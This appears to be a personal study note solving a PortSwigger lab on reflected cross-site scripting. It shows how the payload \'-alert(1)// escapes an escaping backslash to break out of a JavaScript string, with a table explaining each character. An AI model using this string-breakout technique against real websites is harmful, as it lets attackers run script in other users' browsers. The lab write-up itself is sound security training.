
# #PortSwigger 


![[Pasted image 20260506165635.png]]



**Description**
	*This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped. perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.*



## Solution Steps


### Step 1: Test the input

1. Enter a random string (e.g., `"/'<>;haha`) in the search box
![[Pasted image 20260506170732.png]]

2. View the page source - your input is inside a JavaScript string:
![[Pasted image 20260506170840.png]]
- **Result:** Backslash is **NOT** escaped




### Step 2: Construct the Payload

Since backslashes aren't escaped, you can use a backslash to **escape the escaping backslash** before the single quote!

**Payload:**
```
\'-alert(1);//
```





### Step 3: How it work

| Character   | Purpose                                                              |
| ----------- | -------------------------------------------------------------------- |
| `\`         | Escapes the escaping backslash that would otherwise escape the quote |
| `'`         | Closes the JavaScript string                                         |
| `-alert(1)` | JavaScript expression that executes `alert(1)`                       |
| `;`         | Ending the Line                                                      |
| `//`        | Comments out the remaining code                                      |

**Resulting code:**
```
var searchTerms = '\\'-alert(1)//';
```

**Browser parses as:**
```
var searchTerms = '\\'   // String contains one backslash
-alert(1)                // Executes alert(1)
//'                      // Comment (ignored)
```





### Step 4: Solved the Lab

1. Enter `\'-alert(1)//` in the search box
2. Click Search
3. Alert fires → Lab solved

Final Payload:
```
\'-alert(1)//
```

![[Pasted image 20260506171215.png]]


![[Pasted image 20260506171344.png]]
